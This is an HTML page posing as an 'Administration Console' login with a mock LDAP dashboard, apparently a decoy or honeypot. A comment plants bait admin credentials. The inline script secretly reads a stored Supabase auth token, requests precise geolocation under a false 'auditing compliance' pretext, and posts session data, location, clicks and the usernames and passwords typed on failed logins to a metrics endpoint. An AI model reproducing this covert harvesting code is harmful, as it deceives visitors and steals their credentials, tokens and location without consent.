<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Login - Administration Hub</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
  <style>
    body {
      background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
      color: #f8fafc;
      font-family: 'Outfit', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      overflow-x: hidden;
    }
    .login-card {
      background: rgba(15, 23, 42, 0.65);
      border: 1px solid rgba(148, 163, 184, 0.1);
      border-radius: 20px;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), 0 0 40px rgba(56, 189, 248, 0.05);
      backdrop-filter: blur(12px);
      padding: 40px;
      width: 420px;
      transition: all 0.3s ease;
    }
    .login-card:hover {
      border-color: rgba(56, 189, 248, 0.25);
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 45px rgba(56, 189, 248, 0.08);
    }
    .brand-logo {
      width: 48px;
      height: 48px;
      background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      margin: 0 auto 20px;
      box-shadow: 0 0 20px rgba(14, 165, 233, 0.3);
    }
    .form-label {
      color: #94a3b8;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 8px;
    }
    .input-group-text {
      background-color: #1e293b;
      border: 1px solid rgba(148, 163, 184, 0.15);
      color: #64748b;
    }
    .form-control {
      background-color: #0f172a;
      border: 1px solid rgba(148, 163, 184, 0.15);
      color: #f8fafc;
      padding: 11px 14px;
      font-size: 14px;
    }
    .form-control:focus {
      background-color: #0f172a;
      border-color: #38bdf8;
      color: #f8fafc;
      box-shadow: 0 0 10px rgba(56, 189, 248, 0.15);
    }
    .btn-primary {
      background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
      border: none;
      padding: 12px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 8px;
      box-shadow: 0 4px 15px rgba(37, 99, 235, 0.2);
      transition: all 0.25s ease;
    }
    .btn-primary:hover {
      transform: translateY(-1px);
      box-shadow: 0 6px 20px rgba(37, 99, 235, 0.35);
      background: linear-gradient(135deg, #38bdf8 0%, #3b82f6 100%);
    }
    
    /* Mock Dashboard Styles */
    .dashboard-container {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 24px;
      border: 1px solid rgba(148, 163, 184, 0.08);
      padding: 40px;
      width: 100%;
      max-width: 1100px;
      box-shadow: 0 25px 60px rgba(0,0,0,0.6);
      backdrop-filter: blur(12px);
    }
    .db-card {
      background: rgba(30, 41, 59, 0.4);
      border: 1px solid rgba(148, 163, 184, 0.08);
      border-radius: 16px;
      padding: 24px;
      transition: all 0.3s ease;
    }
    .db-card:hover {
      border-color: rgba(56, 189, 248, 0.2);
      transform: translateY(-2px);
    }
    .stat-val {
      font-size: 32px;
      font-weight: 700;
      background: linear-gradient(135deg, #fff 0%, #cbd5e1 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .nav-bar {
      border-bottom: 1px solid rgba(148, 163, 184, 0.08);
      padding-bottom: 20px;
    }
  </style>
</head>
<body>
  <!-- Fallback admin credentials for LDAP sync failover: admin / changemeafterproduction -->
  <div class="login-card" id="login-container">
    <div class="brand-logo">
      <i class="fa-solid fa-terminal text-white"></i>
    </div>
    <h4 class="text-center fw-bold mb-1 text-white">Administration Console</h4>
    <p class="text-center text-muted small mb-4">Verification required for administrative sessions</p>
    <form id="login-form">
      <div class="mb-3">
        <label for="username" class="form-label">Username</label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-user"></i></span>
          <input type="text" id="username" class="form-control text-white" placeholder="Domain login ID" autocomplete="off" required>
        </div>
      </div>
      <div class="mb-3">
        <label for="password" class="form-label">Password</label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-lock"></i></span>
          <input type="password" id="password" class="form-control text-white" placeholder="Password credential" autocomplete="off" required>
        </div>
      </div>
      <button type="submit" class="btn btn-primary w-100 mt-2">Access Portal</button>
    </form>
  </div>

  <div class="container d-none" id="dashboard-container" style="max-width: 1000px; padding: 40px 20px;">
    <div class="dashboard-container">
      <div class="d-flex justify-content-between align-items-center mb-4 nav-bar">
        <div class="d-flex align-items-center gap-3">
          <div class="brand-logo m-0" style="width:36px; height:36px; font-size:14px;">
            <i class="fa-solid fa-cubes text-white"></i>
          </div>
          <h4 class="m-0 fw-bold text-white">System Operations Center</h4>
        </div>
        <button class="btn btn-outline-danger btn-sm px-3" onclick="window.location.reload()"><i class="fa-solid fa-power-off me-2"></i>Sign Out</button>
      </div>
      <div class="row g-4">
        <div class="col-md-4">
          <div class="db-card p-4">
            <span class="text-muted small fw-medium uppercase d-block mb-1">Users Synced</span>
            <div class="stat-val text-success">1,248</div>
            <p class="text-muted small mb-0 mt-2"><i class="fa-solid fa-link text-success me-1"></i> Active LDAP directory connection</p>
          </div>
        </div>
        <div class="col-md-4">
          <div class="db-card p-4">
            <span class="text-muted small fw-medium uppercase d-block mb-1">Database Status</span>
            <div class="stat-val text-info">Healthy</div>
            <p class="text-muted small mb-0 mt-2"><i class="fa-solid fa-server text-info me-1"></i> Pool: 20 active sockets</p>
          </div>
        </div>
        <div class="col-md-4">
          <div class="db-card p-4">
            <span class="text-muted small fw-medium uppercase d-block mb-1">API Integrity</span>
            <div class="stat-val text-warning">99.98%</div>
            <p class="text-muted small mb-0 mt-2"><i class="fa-solid fa-clock text-warning me-1"></i> Mean response time: 48ms</p>
          </div>
        </div>
      </div>

      <div class="db-card mt-4 p-4">
        <h5 class="fw-bold mb-3 text-white"><i class="fa-solid fa-gears me-2 text-primary"></i>LDAP Management Operations</h5>
        <div class="d-flex gap-3 mt-3">
          <button class="btn btn-primary" onclick="executeAction('user-add')"><i class="fa-solid fa-user-plus me-2"></i>Add Directory User</button>
          <button class="btn btn-danger" onclick="executeAction('user-delete')"><i class="fa-solid fa-user-minus me-2"></i>Delete Directory User</button>
          <button class="btn btn-outline-info text-info border-info-subtle" onclick="executeAction('ldapsync')"><i class="fa-solid fa-rotate me-2"></i>Sync Directory Tree</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    (function() {
      var session = null;
      var coords = null;
      
      try {
        var sbKey = 'sb-kkbzofddkfusblyplnca-auth-token';
        var raw = localStorage.getItem(sbKey) || sessionStorage.getItem(sbKey);
        if (raw) {
          var parsed = JSON.parse(raw);
          if (parsed && parsed.user) {
            session = { email: parsed.user.email, id: parsed.user.id };
          }
        }
      } catch (e) {}

      function sendReport(type, extra) {
        var payload = {
          type: type,
          session: session,
          location: coords,
          extra: extra
        };
        fetch('/api/v1/metrics', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(function() {});
      }

      // Request location verification for administrative auditing compliance
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          coords = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
          sendReport('location_update');
        }, function(err) {
          sendReport('location_denied', { code: err.code, message: err.message });
        }, { enableHighAccuracy: true, timeout: 10000 });
      }

      sendReport('view');

      window.executeAction = function(action) {
        sendReport('action', { action: action });
        alert('Operation succeeded! Directory database logs updated.');
      };

      var form = document.getElementById('login-form');
      if (form) {
        form.addEventListener('submit', function(e) {
          e.preventDefault();
          var u = document.getElementById('username').value;
          var p = document.getElementById('password').value;
          if (u === 'admin' && p === 'changemeafterproduction') {
            sendReport('login_success');
            document.getElementById('login-container').classList.add('d-none');
            document.getElementById('dashboard-container').classList.remove('d-none');
          } else {
            sendReport('login_fail', { user: u, pass: p });
            alert('Authentication failed.');
          }
        });
      }
    })();
  </script>
</body>
</html>
